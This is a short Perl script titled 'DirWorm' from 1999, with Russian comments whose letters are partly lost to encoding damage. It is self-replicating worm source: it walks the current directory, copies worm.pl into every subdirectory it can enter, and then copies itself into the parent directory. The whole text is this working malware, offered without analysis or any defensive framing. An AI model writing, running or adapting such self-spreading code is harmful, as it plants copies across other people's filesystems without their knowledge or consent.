# DirWorm by -Byst- (c) 1999
while (<*>)                     # Ищем все ф йлы в текущей директории
{
  if (chdir($_)) {              # Если это директория - сменить текущую н  нее
   @command = ("cp ../worm.pl ./worm.pl > /dev/null");
   system @command;             # Вызов системной функции копиров ния ф йл 
   chdir("..");                 # Возр щ емся обр тно в н ч льную директорию
  }
}
@command = ("cp ./worm.pl ../worm.pl");
system @command;                # Копируем тело в родительскую директорию


